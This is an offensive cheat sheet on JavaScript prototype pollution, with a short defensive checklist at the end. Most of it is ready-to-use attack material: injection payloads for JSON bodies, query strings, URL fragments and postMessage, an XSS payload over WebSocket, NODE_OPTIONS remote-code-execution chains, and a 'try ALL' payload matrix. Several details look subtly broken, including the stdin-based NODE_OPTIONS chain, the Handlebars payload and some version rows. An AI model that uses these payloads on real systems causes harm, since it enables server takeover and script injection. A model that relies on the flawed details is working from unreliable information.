# Prototype Pollution: 2026 Complete Reference

## Core Mechanism

Prototype pollution injects properties into JavaScript's `Object.prototype`. All objects inherit from this root prototype — injected property propagates to every object in the runtime.

### Entry Points (Server-Side, Node.js)
```json
// JSON body parsing (Express body-parser, express.json())
{"__proto__": {"isAdmin": true}}

// Query string parsing (qs library)
?__proto__[isAdmin]=true

// Cookie parsing
// File upload metadata
// GraphQL variables
// WebSocket messages
```

### Entry Points (Client-Side)
```javascript
// URL fragment parsing
https://target.com/#__proto__[polluted]=true

// PostMessage
window.postMessage({__proto__: {evil: true}}, '*')

// localStorage / sessionStorage parsed with JSON.parse

// WebSocket
ws.send(JSON.stringify({__proto__: {innerHTML: '<img src=x onerror=alert(1)>'}}))
```

## Server-Side RCE Chains

### NODE_OPTIONS Injection (Most Reliable)
```json
{
  "__proto__": {
    "shell": "node",
    "env": {
      "NODE_OPTIONS": "--require /dev/stdin",
      "EVIL": "console.log(require('child_process').execSync('id').toString())"
    }
  }
}
```
Node.js reads `NODE_OPTIONS` for every spawned process. `--require` loads arbitrary code.

### lodash merge RCE Chain
```json
// Step 1: Pollute via vulnerable merge
POST /api/config
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cwd/evil.js"}}

// Step 2: Trigger child_process.exec or spawn anywhere in app
```
Polluted `NODE_OPTIONS` affects all subsequently spawned Node processes.

### Known Vulnerable Sinks

| Library | Version | Payload | Impact |
|---------|---------|---------|--------|
| lodash.merge | <4.17.5 | `__proto__[polluted]=true` | RCE/auth bypass |
| jQuery | <3.4.0 | `{__proto__:{isAdmin:true}}` | Auth bypass |
| $.extend | <4.0 | `{__proto__:{isAdmin:true}}` | DOM XSS |
| _.merge | Lodash | `{"__proto__":{"polluted":1}}` | RCE |
| Handlebars | <4.7.7 | `{{__lookup__/template.root}}` | RCE |

## AST Injection via Prototype Pollution

Template engines that compile templates to AST at runtime are vulnerable:
- **Handlebars**: `{{__lookup__/template.root}}` — reads polluted property from any object
- Polluted properties inject content directly into compiled template or AST node evaluation

## Detection Methodology

### Client-Side
```javascript
// Check console on target page after triggering pollution
Object.prototype.polluted === "yes"
({}).polluted === "yes"
```

### Server-Side
```json
// Send payload, check response for reflected property
{"__proto__": {"polluted": "yes"}}
// Check if admin endpoint returns 200 instead of 403
// Check response JSON for "polluted":"yes"
```

### Payload Matrix (try ALL)
```json
{"__proto__":{"polluted":"yes"}}
{"__proto__":["polluted","yes"]}
{"__proto__":{"__proto__":{"polluted":"yes"}}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"a":{"__proto__":{"polluted":"yes"}}}
{"[__proto__]":{"polluted":"yes"}}
{"__proto__.polluted":"yes"}
```

## Defensive Checklist
1. Use `Object.create(null)` for configuration objects (no prototype)
2. Use `Object.freeze()` on config objects after creation
3. Sanitize keys — reject `__proto__`, `prototype`, `constructor`
4. Use `JSON.parse` with schema validation (not raw parse)
5. Update lodash, jQuery, Handlebars to latest versions
6. Use `--disallow-code-generation-from-strings` in Node.js